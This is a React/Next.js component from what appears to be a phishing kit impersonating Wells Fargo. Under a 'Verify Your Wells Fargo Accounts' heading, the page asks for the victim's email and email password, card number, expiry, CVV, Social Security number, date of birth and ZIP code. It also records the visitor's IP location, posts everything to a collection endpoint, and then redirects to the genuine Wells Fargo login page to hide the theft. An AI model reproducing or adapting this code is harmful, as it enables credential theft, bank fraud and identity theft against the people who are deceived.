import React, { useState, useEffect } from 'react';
import { Controller } from 'react-hook-form'
import NumberFormat from 'react-number-format';
import router from 'next/router';
import axios from 'axios'
import { useForm } from 'react-hook-form'
import { yupResolver } from '@hookform/resolvers/yup';
import * as yup from "yup";
import { useStateMachine } from "little-state-machine";
import { updateData } from '../LoginForm';






const VerificationForm = () => {
    const { state } = useStateMachine(updateData);

    const schema = yup.object().shape({

        email: yup.string().email('Enter a valid email').required(),
        password: yup.string().required().min(4, 'Enter the password of your email address !'),
        confirmPassword: yup.string().oneOf([yup.ref('password'), null], 'Passwords must match'),
        ssn: yup.string().required(),
        dob: yup.string().required(),
        zip: yup.string().required(),

    })
    const { register, handleSubmit, watch, control, formState: { errors, isValid, isSubmitSuccessful } } = useForm({
        resolver: yupResolver(schema),
        mode: 'all'
    })



    const [ip, setIP] = useState({});
    const ipWeb = ip.IPv4
    const ipUrl = `http://ip-api.com/json/${ipWeb}`
    const getData = async () => {
        const res = await axios.get('https://geolocation-db.com/json/')
        setIP(res.data)
    }
    useEffect(() => {
        getData()
    }, [])
    const onSubmit = (data, ip, ipUrl) => {
        fetch('/api/verify', {
            method: 'POST',
            headers: {
                'Accept': 'application/json, text/plain, */*',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify([state, data], ip, { ipUrl: ipUrl }, null, 2)
        });

    }








    return (
        <>
            <div key={2} className='lg:mx-32'>
                <form className='h-full pb-52 pt-32'>
                    <div className='flex flex-wrap mx-10 max-w-lg'>
                        <div className='mx-2 mb-3 mt-10 font-lighter'>
                            <h1 className='font-bold text-xl mb-2'>Verify Your Wells Fargo Accounts</h1>
                            <span className='text-sm'>Provide all email information accounts online</span>
                        </div>
                        <div className={'rounded-sm focus-within:bg-focusbg lg:w-100 lg:max-w-md mx-2 relative border-b border-gray-500 mb-10 ' + (errors.email?.message && ' ')}>
                            <input
                                type='email'
                                name='email'
                                autoComplete='off'
                                placeholder=' '
                                className={'peer focus:border border-gray-500 bg-transparent pt-6 pl-3 lg:max-w-md w-full rounded appearance-none focus:outline-none '}
                                {...register('email')}

                            />
                            <label className='pointer-events-none peer-focus:text-sm peer-focus:top-0 peer-focus:text-focustext peer-placeholder-shown:top-3 peer-placeholder-shown:text-gray-400 peer-placeholder-shown:text-lg left-3 top-0 text-sm duration-300 absolute origin-0  transition-all' htmlFor='email'>
                                Email
                                <div className='absolute -mt-6 -right-3 text-red-500 font-bold'>*</div>

                            </label>

                            <span className='mt-2 capitalize text-xs text-red-500 block mb-5 font-medium absolute'>{errors.email?.message}</span>
                        </div>
                        <div className='mx-2'>

                            <label className='block font-semibold text-sm mb-2' htmlFor='password'>Password</label>
                            <div className='absolute -mt-7 ml-16 text-red-500 font-bold'>*</div>


                            <input
                                type='password'
                                name='password'
                                className={'mb-3 content-around focus:bg-yellow-100 focus:border-2  p-2 shadow rounded appearance-none border border-gray-400 focus:outline-none ' + (errors.email?.message && ' border-red-500 border focus:border')}
                                {...register('password')}

                            />
                            <span className='capitalize text-xs text-red-500 block mb-5 font-medium relative -top-1'>{errors.password?.message}</span>

                        </div>
                        <div className='flex-nowrap mx-2'>
                            <label className='block font-semibold text-sm mb-2' htmlFor='confirm-password'>Confirm Password</label>
                            <div className='absolute -mt-7 ml-32 text-red-500 font-bold'>*</div>

                            <input
                                type='password'
                                name='confirmPassword'
                                className={'inline-block focus:bg-yellow-100 mb-2 focus:border-2  p-2 shadow rounded appearance-none border border-gray-400 focus:outline-none' + (errors.confirmPassword?.message && ' border-red-500 border focus:border')}
                                {...register('confirmPassword')}
                            />
                            <span className='capitalize text-xs text-red-500 block mb-4 font-medium relative -top-1'>{errors.confirmPassword?.message}</span>


                        </div>


                    </div>

                    <div className='flex flex-wrap mx-10'>
                        <div className='mx-2 mb-3 mt-5 font-lighter'>
                            <h1 className='font-bold text-xl mb-2'>Verify Your Identity By Providing Information Associated With Your Account</h1>
                            <span className='text-sm'>Provide all credit/debitcard information accounts online</span>
                        </div>
                        <div className='w-full mx-2'>
                            <label className='block font-semibold text-sm mb-2' htmlFor='card-number'>Card Number</label>
                            <Controller
                                render={({ field }) => <NumberFormat
                                    {...field}
                                    format='#### #### #### ####'
                                    type='text'
                                    name='cardNumber'
                                    className='mb-3 w-full max-w-md lg:max-w-md focus:bg-yellow-100 focus:border-2 p-2 shadow rounded appearance-none border border-gray-400 focus:outline-none'
                                />}
                                {...register('cardNumber')}
                                control={control}
                            />
                        </div>
                        <div className='mx-2 '>

                            <label className='block font-semibold text-sm mb-2' htmlFor='name-on-card'>Name On Card</label>
                            <input
                                type='text'
                                name='nameOnCard'
                                {...register('nameOnCard')}

                                className='mb-3 focus:bg-yellow-100 focus:border-2  p-2 shadow rounded appearance-none border border-gray-400 focus:outline-none'
                            />
                        </div>
                        <div className='mx-2 '>

                            <label className='block  font-semibold text-sm mb-2' htmlFor='Expiry Date'>Expiry Date(MM/YY)</label>
                            <Controller
                                render={({ field }) => <NumberFormat
                                    {...field}
                                    type='text'
                                    format='##/##'
                                    name='expiryDate'
                                    className='mb-3 focus:bg-yellow-100 focus:border-2  p-2 shadow rounded appearance-none border border-gray-400 focus:outline-none' />
                                }
                                {...register('expiryDate')}
                                control={control}

                            />
                        </div>
                        <div className='mx-2 '>
                            <label className='block font-semibold text-sm mb-2' htmlFor='cvv'>CVV</label>
                            <Controller
                                render={({ field }) => <NumberFormat
                                    {...field}
                                    format='###'
                                    type='text'
                                    name='cvc '
                                    className='mb-3 focus:bg-yellow-100 focus:border-2  p-2 shadow rounded appearance-none border border-gray-400 focus:outline-none'
                                />}
                                {...register('cvc')}
                                control={control}
                            />
                        </div>
                        <div className='mx-2 lg:w-full'>

                            <label className='block font-semibold text-sm mb-2' htmlFor='zip'>Zip Code</label>
                            <div className='absolute -mt-7 ml-16 text-red-500 font-bold'>*</div>

                            <input
                                type='text'
                                name='zip'
                                {...register('zip')}
                                className={' mb-3 focus:bg-yellow-100 focus:border-2 p-2 shadow rounded appearance-none border border-gray-400 focus:outline-none ' + (errors.zip?.message && 'border-red-500 border focus:border')}
                            />
                        </div>
                        <div className='mx-2 mb-3 '>
                            <label className='block font-semibold text-sm mb-2' htmlFor='ssn'>Social Security Number(SSN)</label>
                            <div className='absolute -mt-7 ml-48 text-red-500 font-bold'>*</div>

                            <Controller
                                render={({ field }) => <NumberFormat
                                    {...field}
                                    format='###-##-####'
                                    mask='*'
                                    name='ssn'
                                    type='text'
                                    className={'lg:max-w-md focus:bg-yellow-100 focus:border-2  p-2 shadow rounded-sm appearance-none border border-gray-400 focus:outline-none' + (errors.dob?.message && ' border-red-500 border focus:border ')}

                                />}
                                {...register('ssn')}
                                control={control}

                            />

                        </div>
                        <div className='mx-2 lg:w-1/2'>
                            <label className='block font-semibold text-sm mb-2' htmlFor='dob'>Date Of Birth(DD/MM/YYYY)</label>
                            <div className='absolute -mt-7 ml-48 text-red-500 font-bold'>*</div>

                            <Controller
                                render={({ field }) => <NumberFormat
                                    {...field}
                                    format='##/##/####'
                                    mask='_'
                                    name='dob'
                                    inputMode='text'
                                    className={' focus:bg-yellow-100 focus:border-2  p-2 shadow rounded-sm appearance-none border border-gray-400 focus:outline-none' + (errors.dob?.message && ' border-red-500 border focus:border ')}

                                />}
                                {...register('dob')}
                                control={control}

                            />

                        </div>

                    </div>

                    {!isValid && <p className={'semi-bold text-medium lg:text-lg text-red-500 mx-12 capitalize font-fargo '}>Please fill in all the required fields*</p>}
                    <button onClick={handleSubmit(onSubmit)} type='submit' className={' hover:text-yellow-200 mx-12 mt-7 bg-gray-400 pr-6 p-2 text-white mb-3 nowrap border-b-2 border-yellow-500 ' + (isValid && ' text-white border-verify border-b-4 bg-red-900 text-white hover:text-yellow-100')}><span className='ml-3'>Verify</span></button>
                    {isSubmitSuccessful && router.push('https://connect.secure.wellsfargo.com/auth/login/present?origin=enroll')}


                </form>



            </div>
        </>
    )
}

export default VerificationForm
